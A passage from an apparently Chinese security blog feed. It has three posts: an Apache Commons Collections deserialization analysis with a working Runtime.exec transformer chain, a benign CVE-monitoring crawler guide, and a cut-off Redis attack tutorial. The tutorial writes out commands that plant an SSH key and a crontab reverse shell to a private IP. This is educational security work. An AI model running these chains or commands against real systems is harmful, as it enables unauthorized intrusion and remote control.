class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义需要执行的本地系统命令</span></span><br><span class="line">    String cmd = <span class="string">"calc"</span>;</span><br><span class="line"></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[]&#123;</span><br><span class="line">                    String.class, Class[].class&#125;, new Object[]&#123;</span><br><span class="line">                    <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                    Object.class, Object[].class&#125;, new Object[]&#123;</span><br><span class="line">                    <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;</span><br><span class="line">            ),</span><br><span class="line">            new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建ChainedTransformer调用链对象</span></span><br><span class="line">        Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行对象转换操作</span></span><br><span class="line">    transformedChain.transform(<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致逻辑为首先调用<code>ConstantTransformer</code>类的<code>transform</code>方法返回<code>java.lang.Runtime</code>对象，</p><p>接下来调用<code>InvokerTransformer</code>类的<code>transform</code>方法获取<code>java.lang.reflect.Method</code>的方法对象，方法为<code>getRuntime</code>，</p><p>再次调用<code>InvokerTransformer</code>类的<code>transform</code>方法反射调用<code>getRuntime</code>方法，获取<code>Runtime</code>类的实例，</p><p>再次调用<code>InvokerTransformer</code>类的<code>transform</code>方法执行<code>Runtime</code>类的<code>exec</code>方法，进行命令执行。</p><p>对上述调用过程进行简化，代码和输入结果如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Apache-commons-collections/image-20200418170952468.png" alt="image-20200418170952468"></p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>通过输出结果，可以发现有两次<code>java.lang.Runtime</code>对象，为何不直接调用<code>exec</code>方法进行命令执行？</p><p>通过查看<code>Runtime</code>类的代码可知，<code>Runtime</code>类的构造方法为私有，只能通过静态方法获取实例。很明显的单例模式。</p><p>代码如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Apache-commons-collections/image-20200418172744432.png" alt="image-20200418172744432"></p><p>因此第一次获取的<code>java.lang.Runtime</code>对象并未实例化，无法执行<code>exec</code>方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">代码：</span><br><span class="line">        System.out.printf(Runtime.class.toString() + &quot;\n&quot;);</span><br><span class="line">        System.out.printf(Runtime.class.getClass().toString() + &quot;\n&quot;);</span><br><span class="line">        System.out.printf(Runtime.getRuntime().getClass().toString() + &quot;\n&quot;);</span><br><span class="line">        </span><br><span class="line">输出：</span><br><span class="line">        class java.lang.Runtime</span><br><span class="line">        class java.lang.Class</span><br><span class="line">        class java.lang.Runtime</span><br></pre></td></tr></table></figure><h3 id="触发利用链-1"><a href="#触发利用链-1" class="headerlink" title="触发利用链-1"></a>触发利用链-1</h3><p>上述分析解决了如何利用漏洞触发点并构造利用链进行命令执行，现在已经使用<code>InvokerTransformer</code>触发点创建了一个含有恶意调用链的<code>Transformer</code>类的Map对象，接着我们应该思考如何才能够将调用链窜起来并执行。</p><p><code>TransformedMap</code>类间接的实现了<code>java.util.Map</code>接口，同时支持对<code>Map</code>的<code>key</code>或者<code>value</code>进行<code>Transformer</code>转换，调用<code>decorate</code>和<code>decorateTransform</code>方法就可以创建一个<code>TransformedMap</code>。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Apache-commons-collections/image-20200418182946556.png" alt="image-20200418182946556"></p><p>只要调用<code>TransformedMap</code>的<code>setValue/put/putAll</code>中的任意方法都会调用<code>InvokerTransformer</code>类的<code>transform</code>方法，从而也就会触发命令执行。</p><p>使用<code>TransformedMap</code>类的<code>setValue</code>触发<code>transform</code>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"calc"</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, new Object[]&#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链对象</span></span><br><span class="line">        Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformedChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// transformedMap.put("v1", "v2");// 执行put也会触发transform</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历Map元素，并调用setValue方法</span></span><br><span class="line">        <span class="keyword">for</span> (Object obj : transformedMap.entrySet()) &#123;</span><br><span class="line">            Map.Entry entry = (Map.Entry) obj;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链</span></span><br><span class="line">            entry.setValue(<span class="string">"test"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(transformedMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上述代码向我们展示了只要在Java的API中的任何一个类实现了<code>java.io.Serializable</code>接口，并且可以传入我们构建的<code>TransformedMap</code>对象还要有调用<code>TransformedMap</code>中的<code>setValue/put/putAll</code>中的任意方法一个方法的类，我们就可以在Java反序列化的时候触发<code>InvokerTransformer</code>类的<code>transform</code>方法实现<code>RCE</code>。</p><h3 id="触发利用链-2"><a href="#触发利用链-2" class="headerlink" title="触发利用链-2"></a>触发利用链-2</h3><p>除了<code>TransformedMap</code>类触发反序列漏洞，<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>还提供了多种基于<code>InstantiateTransformer/InvokerTransformer</code>构建调用链方式：LazyMap、PriorityQueue、BadAttributeValueExpException、HashSet、Hashtable、AnnotationInvocationHandler等。</p><p>地址（带有CommonsCollections的文件）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://javasec.org/javase/JavaDeserialization/Collections.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Apache Commons Collections&amp;lt;=3.2.1反序列化漏洞是Java反序列化的经典漏洞，Apache-commons-collections组件为Java提供了很多基础常用且强大的数据结构，方便开发。本次分析的版本选择3.1。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaSec" scheme="https://www.sys71m.top/categories/JavaSec/"/>
    
    
      <category term="反序列化" scheme="https://www.sys71m.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="JavaSec" scheme="https://www.sys71m.top/tags/JavaSec/"/>
    
  </entry>
  
  <entry>
    <title>基于Scrapy的漏洞监控平台</title>
    <link href="https://www.sys71m.top/2020/03/29/%E5%9F%BA%E4%BA%8EScrapy%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/"/>
    <id>https://www.sys71m.top/2020/03/29/%E5%9F%BA%E4%BA%8EScrapy%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0/</id>
    <published>2020-03-29T14:20:07.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>主要目的用于安全研究，获取最新安全咨询。基于scrapy框架，使用scrapy-redis插件提升爬虫性能，实现增量爬取。redis同时作为数据库保存数据。</p><a id="more"></a>  <p>主要目的用于安全研究，获取最新安全咨询，无任何漏洞利用细节，严禁用于非法活动。为了保证信息的易读性，CVE漏洞详细信息主要参照CNNVD官网信息，可能导致部分CVE无法被收录。更多信息可以通过关注CVE官方的Twitter获取。</p><h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><p>下载项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ttonys/Scrapy-CVE-CNVD</span><br></pre></td></tr></table></figure><p>安装依赖(python3环境)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>redis安装—-docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull redis</span><br><span class="line">docker run -itd --name redis-test -p 6379:6379 redis</span><br></pre></td></tr></table></figure><p>redis安装—-本机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参照网上教程</span><br></pre></td></tr></table></figure><p>修改配置，<code>pipelines.py</code>文件36-38行，使用自己注册163邮箱，以及所获取的授权码（非个人密码）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fromaddr = &apos;xxxx@163.com&apos;</span><br><span class="line">password = &apos;xxxxxxxxxxxxxx&apos;</span><br><span class="line">toaddrs = &apos;xxxx@163.com&apos;</span><br></pre></td></tr></table></figure><p>修改配置，<code>run.sh</code>中，将路径修改为自己本机的路径，参照如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">cd /root/OnePiece</span><br><span class="line">/usr/local/bin/scrapy crawl all-redis</span><br></pre></td></tr></table></figure><p>测试，将<code>run.sh</code>改为755权限，运行<code>./run.sh</code>，查看是否收到邮件通知</p><p>添加定时任务，注意使用绝对路径，按照本机实际路径填写，参考如下（每天下午2点半执行）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 14 * * * /root/OnePiece/run.sh</span><br></pre></td></tr></table></figure><h2 id="框架流程"><a href="#框架流程" class="headerlink" title="框架流程"></a>框架流程</h2><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/scrapy/image-20200322173852414.png" alt="image-20200322173852414"></p><h2 id="具体功能"><a href="#具体功能" class="headerlink" title="具体功能"></a>具体功能</h2><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/scrapy/image-20200322175258081.png" alt="image-20200322175258081"></p><h2 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h2><p>以下配置均在<code>setting.py</code>文件中设置</p><p>日志等级，主要为了简化输出，便于查看爬取结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOG_LEVEL = &quot;WARNING&quot;</span><br></pre></td></tr></table></figure><p>爬取间隔，防止访问过快被ban</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOAD_DELAY = 3</span><br></pre></td></tr></table></figure><p>请求头设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">USER_AGENT = &apos;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.6)&apos;</span><br><span class="line">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class="line">  &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,</span><br><span class="line">  &apos;Accept-Language&apos;: &apos;en&apos;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中文编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FEED_EXPORT_ENCODING = &apos;utf-8&apos;</span><br></pre></td></tr></table></figure><p>使用scrapy-redis插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#确保所有的爬虫通过Redis去重</span><br><span class="line">DUPEFILTER_CLASS = &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span><br><span class="line"></span><br><span class="line"># 启动从reids缓存读取队列,调度爬虫</span><br><span class="line">SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;</span><br><span class="line"></span><br><span class="line"># 调度状态持久化，不清理redis缓存，允许暂停/启动爬虫</span><br><span class="line">SCHEDULER_PERSIST = True</span><br><span class="line"></span><br><span class="line"># 请求调度使用优先队列（默认)</span><br><span class="line">SCHEDULER_QUEUE_CLASS = &apos;scrapy_redis.queue.SpiderPriorityQueue&apos;</span><br></pre></td></tr></table></figure><h2 id="爬取目标"><a href="#爬取目标" class="headerlink" title="爬取目标"></a>爬取目标</h2><p>国家信息安全漏洞共享平台</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnvd.org.cn/</span><br></pre></td></tr></table></figure><p>国家信息安全漏洞库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.cnnvd.org.cn/</span><br></pre></td></tr></table></figure><p>today-cve</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cassandra.cerias.purdue.edu/CVE_changes/today.html</span><br></pre></td></tr></table></figure><p>cve官网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cve.mitre.org/</span><br></pre></td></tr></table></figure><h2 id="运行示例"><a href="#运行示例" class="headerlink" title="运行示例"></a>运行示例</h2><h3 id="数据保存"><a href="#数据保存" class="headerlink" title="数据保存"></a>数据保存</h3><p><img src="https://raw.githubusercontent.com/ttonys/Scrapy-CVE-CNVD/master/pic/image-20200329213227688.png" alt="image-20200324221552567"></p><h3 id="邮件内容"><a href="#邮件内容" class="headerlink" title="邮件内容"></a>邮件内容</h3><p><img src="https://raw.githubusercontent.com/ttonys/Scrapy-CVE-CNVD/master/pic/image-20200329213718480.png" alt="image-20200324222446514"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;主要目的用于安全研究，获取最新安全咨询。基于scrapy框架，使用scrapy-redis插件提升爬虫性能，实现增量爬取。redis同时作为数据库保存数据。&lt;/p&gt;
    
    </summary>
    
    
      <category term="爬虫" scheme="https://www.sys71m.top/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Scrapy" scheme="https://www.sys71m.top/tags/Scrapy/"/>
    
      <category term="CVE" scheme="https://www.sys71m.top/tags/CVE/"/>
    
      <category term="CVND" scheme="https://www.sys71m.top/tags/CVND/"/>
    
  </entry>
  
  <entry>
    <title>Redis安全问题</title>
    <link href="https://www.sys71m.top/2020/03/15/Redis%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <id>https://www.sys71m.top/2020/03/15/Redis%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</id>
    <published>2020-03-15T08:57:40.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>Redis服务的默认端口是6379，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><a id="more"></a>  <h2 id="Redis理解及使用场景"><a href="#Redis理解及使用场景" class="headerlink" title="Redis理解及使用场景"></a>Redis理解及使用场景</h2><p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI <a href="https://baike.baidu.com/item/C语言" target="_blank" rel="noopener">C语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a href="https://baike.baidu.com/item/数据库/103728" target="_blank" rel="noopener">数据库</a>，并提供多种语言的API。和MYSQL等常见的数据库都有着共同的存储数据的作用，但Redis的主要适用于如下场景：</p><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p>缓存现在几乎是所有中大型网站都在用的必杀技，合理的利用缓存不仅能够提升网站访问速度，还能大大降低数据库的压力。Redis提供了键过期功能，也提供了灵活的键淘汰策略，所以，现在Redis用在缓存的场合非常多。</p><h3 id="排行榜"><a href="#排行榜" class="headerlink" title="排行榜"></a>排行榜</h3><p>很多网站都有排行榜应用的，如京东的月度销量榜单、商品按时间的上新排行榜等。Redis提供的有序集合数据类构能实现各种复杂的排行榜应用。</p><h3 id="计数器"><a href="#计数器" class="headerlink" title="计数器"></a>计数器</h3><p>什么是计数器，如电商网站商品的浏览量、视频网站视频的播放数等。为了保证数据实时效，每次浏览都得给+1，并发量高时如果每次都请求数据库操作无疑是种挑战和压力。Redis提供的incr命令来实现计数器功能，内存操作，性能非常好，非常适用于这些计数场景。</p><h3 id="分布式会话"><a href="#分布式会话" class="headerlink" title="分布式会话"></a>分布式会话</h3><p>集群模式下，在应用不多的情况下一般使用容器自带的session复制功能就能满足，当应用增多相对复杂的系统中，一般都会搭建以Redis等内存数据库为中心的session服务，session不再由容器管理，而是由session服务及内存数据库管理。</p><h3 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h3><p>在很多互联网公司中都使用了分布式技术，分布式技术带来的技术挑战是对同一个资源的并发访问，如全局ID、减库存、秒杀等场景，并发量不大的场景可以使用数据库的悲观锁、乐观锁来实现，但在并发量高的场合中，利用数据库锁来控制资源的并发访问是不太理想的，大大影响了数据库的性能。可以利用Redis的setnx功能来编写分布式的锁，如果设置返回1说明获取锁成功，否则获取锁失败，实际应用中要考虑的细节要更多。</p><h3 id="社交网络"><a href="#社交网络" class="headerlink" title="社交网络"></a>社交网络</h3><p>点赞、踩、关注/被关注、共同好友等是社交网站的基本功能，社交网站的访问量通常来说比较大，而且传统的关系数据库类型不适合存储这种类型的数据，Redis提供的哈希、集合等数据结构能很方便的的实现这些功能。</p><h3 id="最新列表"><a href="#最新列表" class="headerlink" title="最新列表"></a>最新列表</h3><p>Redis列表结构，LPUSH可以在列表头部插入一个内容ID作为关键字，LTRIM可用来限制列表的数量，这样列表永远为N个ID，无需查询最新的列表，直接根据ID去到对应的内容页即可。</p><h3 id="消息系统"><a href="#消息系统" class="headerlink" title="消息系统"></a>消息系统</h3><p>消息队列是大型网站必用中间件，如ActiveMQ、RabbitMQ、Kafka等流行的消息队列中间件，主要用于业务解耦、流量削峰及异步处理实时性低的业务。Redis提供了发布/订阅及阻塞队列功能，能实现一个简单的消息队列系统。另外，这个不能和专业的消息中间件相比。</p><h2 id="Redis常见攻击方式"><a href="#Redis常见攻击方式" class="headerlink" title="Redis常见攻击方式"></a>Redis常见攻击方式</h2><p>先总结一下，后文会实际演示。</p><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><h4 id="写入SSH公钥登录服务器"><a href="#写入SSH公钥登录服务器" class="headerlink" title="写入SSH公钥登录服务器"></a>写入SSH公钥登录服务器</h4><h4 id="web目录写入webshell"><a href="#web目录写入webshell" class="headerlink" title="web目录写入webshell"></a>web目录写入webshell</h4><h4 id="定时任务反弹shell"><a href="#定时任务反弹shell" class="headerlink" title="定时任务反弹shell"></a>定时任务反弹shell</h4><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h3 id="主从复制RCE"><a href="#主从复制RCE" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h3><h3 id="历史CVE"><a href="#历史CVE" class="headerlink" title="历史CVE"></a>历史CVE</h3><h4 id="CVE-2016-8339"><a href="#CVE-2016-8339" class="headerlink" title="CVE-2016-8339"></a>CVE-2016-8339</h4><h4 id="CVE-2015-8080"><a href="#CVE-2015-8080" class="headerlink" title="CVE-2015-8080"></a>CVE-2015-8080</h4><h4 id="CVE-2015-4335"><a href="#CVE-2015-4335" class="headerlink" title="CVE-2015-4335"></a>CVE-2015-4335</h4><h4 id="CVE-2013-7458"><a href="#CVE-2013-7458" class="headerlink" title="CVE-2013-7458"></a>CVE-2013-7458</h4><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><h2 id="Redis常见命令"><a href="#Redis常见命令" class="headerlink" title="Redis常见命令"></a>Redis常见命令</h2><p>查看信息：info</p><p>删除所有数据库内容：flushall</p><p>刷新数据库：flushdb</p><p>查看所有键：keys *，使用select num可以查看键值数据</p><p>设置变量：set tmp_val “sys71m”</p><p>查看变量值：get tmp_val</p><p>查看备份文件路径：config get dir</p><p>设置备份文件路径：config set dir dirpath</p><p>查看备份文件名：config get dbfilename</p><p>设置备份文件名：config set dbfilename filename</p><p>保存备份文件：save</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>版本：Redis4.0.14</p><p>下载地址：<a href="http://download.redis.io/releases/" target="_blank" rel="noopener">http://download.redis.io/releases/</a></p><p>安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar xzf redis-4.0.14.tar.gz</span><br><span class="line">cd redis-4.0.14/</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">//修改69行，默认只能本地访问，修改如下：</span><br><span class="line">bind 0.0.0.0</span><br></pre></td></tr></table></figure><p>启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/Redis/image-20200315154908711.png" alt="image-20200315154908711"></p><h2 id="未授权访问-1"><a href="#未授权访问-1" class="headerlink" title="未授权访问"></a>未授权访问</h2><h3 id="敏感信息泄露-1"><a href="#敏感信息泄露-1" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/Redis/image-20200315141045861.png" alt="image-20200315141045861"></p><h3 id="web目录写入webshell-1"><a href="#web目录写入webshell-1" class="headerlink" title="web目录写入webshell"></a>web目录写入webshell</h3><p>注意：已知网站的绝对路径，该目录下具有读写权限</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/Redis/image-20200315141617512.png" alt="image-20200315141617512"></p><p>访问写入的shell：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/Redis/image-20200315141739554.png" alt="image-20200315141739554"></p><h3 id="写入SSH公钥"><a href="#写入SSH公钥" class="headerlink" title="写入SSH公钥"></a>写入SSH公钥</h3><p>这里攻击环境切换为kali，windows太麻烦。。。</p><p>生成ras公钥：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/Redis/image-20200315154623167.png" alt="image-20200315154623167"></p><p>此时在<code>/root/.ssh/</code>目录下会生成两个文件<code>is_rsa</code>和<code>is_rsa.pub</code>。</p><p>将公钥写入目标的<code>root/.ssh/</code>目录下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#设置备份路径</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line"># 保存key的时候加上两个\n是为了避免和Redis里其他缓存数据混合</span><br><span class="line">set key &quot;********&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/Redis/image-20200315160254669.png" alt="image-20200315160254669"></p><p>ssh连接：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/Redis/image-20200315160438191.png" alt="image-20200315160438191"></p><h3 id="定时任务反弹shell-1"><a href="#定时任务反弹shell-1" class="headerlink" title="定时任务反弹shell"></a>定时任务反弹shell</h3><p>该方法只能CentOS上使用，Ubuntu、Debian上行不通。原因如下：</p><ul><li>权限问题，Ubuntu定时任务需要root权限；</li><li>Redis备份文件存在乱码，而Debian和Ubuntu对定时任务的格式校验很严格，因此在Debian和Ubuntu上会报错，而在CentOS上不会报错；</li></ul><p>大致原理与上面相似，kali是在debian的基础上改的。。云实验。。。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set payload &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.227.133/666 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><p>写入<code>/etc/passwd</code>文件实现任意账号密码重置</p><p>写入Windows启动项</p><h2 id="主从复制REC"><a href="#主从复制REC" class="headerlink" title="主从复制REC"></a>主从复制REC</h2><h3 id="使用范围"><a href="#使用范围" class="headerlink" title="使用范围"></a>使用范围</h3><p>Redis未授权访问在4.x/5.0.5以前版本下</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Redis是一个使用ANSI 